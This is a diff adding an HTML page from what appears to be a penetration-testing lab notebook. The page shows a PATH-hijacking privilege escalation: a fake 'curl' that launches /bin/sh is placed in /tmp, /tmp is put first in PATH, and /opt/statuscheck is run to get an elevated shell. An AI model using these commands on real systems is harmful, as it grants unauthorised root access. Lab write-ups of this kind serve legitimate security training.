@@ -1,0 +1,8 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>4.2 Export path for rouge curl </title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><h1><b><u>4.2 Export path for rouge curl </u></b></h1><br />The following commands will call “/bin/bash” and execute the “statuscheck” program.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<br /><span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"/bin/sh"</span>&nbsp;&gt;&nbsp;curl<br /><span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;777&nbsp;curl<br /><span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#7f0044;font-weight:400">$PATH</span><br /><span style="color:#ff9d00;font-weight:700">export</span>&nbsp;<span style="color:#7f0044;font-weight:400">PATH</span>=<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$PATH</span><br /><span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>statuscheck<br /><span style="color:#ff9d00;font-weight:700">id</span></div></div><br /><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/380-1.png" alt="images/380-1.png" /><br /><br />Effective UID (EUID) is the user you changed to, UID is the original user.<br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>
